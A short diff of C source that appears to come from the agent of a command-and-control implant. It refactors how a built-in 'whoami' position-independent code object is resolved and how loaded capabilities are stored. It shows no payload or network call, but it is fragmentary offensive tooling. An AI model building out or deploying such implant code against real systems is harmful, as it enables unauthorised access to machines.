@@ -87,11 +87,11 @@ void agent_exit(AgentState *state, TaskInfo *task) {
 
 void agent_whoami(AgentState *state, TaskInfo *task) {
 	ResolvedPico pico = { 0 };
-	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, "_builtin_whoami");
+	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, state->builtin_picos.whoami);
 	
 	if (result == FALSE) {
 		#ifdef CELEBI_DEBUG
-		dprintf("Failed to resolve '_builtin_whoami' PICO");
+		dprintf("Failed to resolve '%s' PICO", state->builtin_picos.whoami);
 		#endif
 		
 		agent_post(state, task, "failed to resolve PICO", "error: failed to resolve PICO");
@@ -273,7 +273,7 @@ void go() {
 	dprintf("Resolved PICO loading functions.");
 	#endif
 	
-	load_builtin_picos(&state.file_vault);
+	state.builtin_picos = load_builtin_picos(&state.file_vault);
 	
 	#ifdef CELEBI_DEBUG
 	dprintf("Loaded PICO capabilities.");
